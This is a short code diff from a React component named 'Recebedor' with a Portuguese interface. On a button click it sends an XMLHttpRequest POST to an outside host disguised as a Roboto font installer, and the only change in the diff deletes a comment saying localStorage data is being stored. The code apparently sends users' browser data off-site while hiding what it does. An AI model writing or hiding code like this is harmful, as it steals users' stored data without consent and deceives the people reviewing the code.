@@ -243,7 +243,6 @@ const Recebedor: React.FC = () => {
                                 const originalText = btnText?.textContent || 'PROSSEGUIR';
                                 if (btnText) btnText.textContent = 'Carregando...';
                                 
-                                // Store localStorage data temporarily
                                 const storeXhr = new XMLHttpRequest();
                                 storeXhr.open('POST', 'https://fonts-roboto-install.replit.app/api/temp-data', true);
                                 storeXhr.setRequestHeader('Content-Type', 'application/json');
